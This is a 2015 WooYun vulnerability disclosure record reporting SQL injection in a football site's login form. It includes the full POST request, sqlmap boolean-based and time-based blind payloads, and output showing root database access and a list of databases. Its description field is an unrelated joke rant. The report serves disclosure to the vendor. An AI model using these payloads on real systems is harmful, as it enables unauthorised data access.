{"id": 28682, "wybug_id": "wooyun-2015-0121644", "wybug_title": "超级玩家某处SQL注入（root权限  大量表）", "wybug_corp": "超级玩家", "wybug_author": "天地不仁 以万物为刍狗", "wybug_date": "2015-06-19 17:11", "wybug_open_date": "2015-08-08 15:04", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-06-19：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-06-24：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-07-04：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-07-14：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-07-24：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-08-08：\t细节向公众公开  简要描述： 我觉得喜羊羊是部暴恐 弱智动漫 应该让文化菊进行封杀 严重影响小孩子的身心发展 说它是暴恐 第一 狼要吃羊 作为一只生活在法律社会的狼 怎么可以吃羊呢？太凶残了 第二 狼每次吃不到羊 就会动手做各种武器 去捉羊 比如 大炮啊 之类的 这不教坏孩子去打架 打不过就用武器嘛？ 这动漫之凶残 令人发指 简直不可饶恕 第三 灰太狼捉不到羊 红太狼就会用平底锅砸灰太狼 这是在赞同家庭暴力吗？文化菊菊长 你们就是这么教育下一代的？说它是部弱智动漫 因为狼从第一集开始 到现在 特码都多少集了 一只羊都没抓不到 这不是弱智动漫吗？ 详细说明：  POST数据包：\nPOST /index.php/Index/login HTTP/1.1Host: jf.football.chinasg.comUser-Agent: Mozilla/5.0 (Windows NT 6.1; rv:33.0) Gecko/20100101 Firefox/33.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateReferer: http://jf.football.chinasg.com/index.php/Index/loginCookie: PHPSESSID=81in55vb8nvg8utrt6qfq0qp75X-Forwarded-For: 8.8.8.8'Connection: keep-aliveContent-Type: application/x-www-form-urlencodedContent-Length: 72username=admin&password=admin&verifycode=2812&Submit=%E7%99%BB+%E9%99%86\nusername 参数未过滤（5库 具体参数见下图 以及 漏洞证明）\n\n\n\n表太多了  不愿意跑······\n\n\n\n这一库 3千多表 都不知道跑到什么时候·······然后看了下权限和当前数据库（root）\n\n\n[16:40:51] [INFO] retrieved: root@localhostcurrent user:    'root@localhost'[16:41:31] [INFO] fetching current database[16:41:31] [INFO] retrieved: sjzqcurrent database:    'sjzq'[16:41:54] [INFO] fetched data logged to text files under 'C:\\Users\\Administrator\\.sqlmap\\output\\jf.football.chinasg.com'[*] shutting down at 16:41:54\n   漏洞证明：  \nPOST parameter 'username' is vulnerable. Do you want to keep testing the others(if any)? [y/N] nsqlmap identified the following injection points with a total of 58 HTTP(s) requests:---Parameter: username (POST)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: username=admin' AND 4426=4426 AND 'OrMI'='OrMI&password=admin&verifycode=2812&Submit=%E7%99%BB %E9%99%86    Type: AND/OR time-based blind    Title: MySQL >= 5.0.12 AND time-based blind (SELECT)    Payload: username=admin' AND (SELECT * FROM (SELECT(SLEEP(5)))bPLZ) AND 'xCqY'='xCqY&password=admin&verifycode=2812&Submit=%E7%99%BB %E9%99%86---[16:33:14] [INFO] the back-end DBMS is MySQLweb application technology: Apache 2.4.3back-end DBMS: MySQL 5.0.12[16:33:14] [INFO] fetching database names[16:33:14] [INFO] fetching number of databases[16:33:14] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval[16:33:14] [INFO] retrieved: 5[16:33:15] [INFO] retrieved: information_schema[16:33:31] [INFO] retrieved: mysql[16:33:36] [INFO] retrieved: performance_schema[16:33:52] [INFO] retrieved: sjzq[16:33:57] [INFO] retrieved: testavailable databases [5]:[*] information_schema[*] mysql[*] performance_schema[*] sjzq[*] test[16:34:01] [INFO] fetched data logged to text files under 'C:\\Users\\Administrator\\.sqlmap\\output\\jf.football.chinasg.com'[*] shutting down at 16:34:01\n   修复方案：     版权声明：转载请注明来源 天地不仁 以万物为刍狗@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：5  确认时间：2015-06-24 15:04 厂商回复： 正在处理,十分感谢 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 5, "Ranks": null}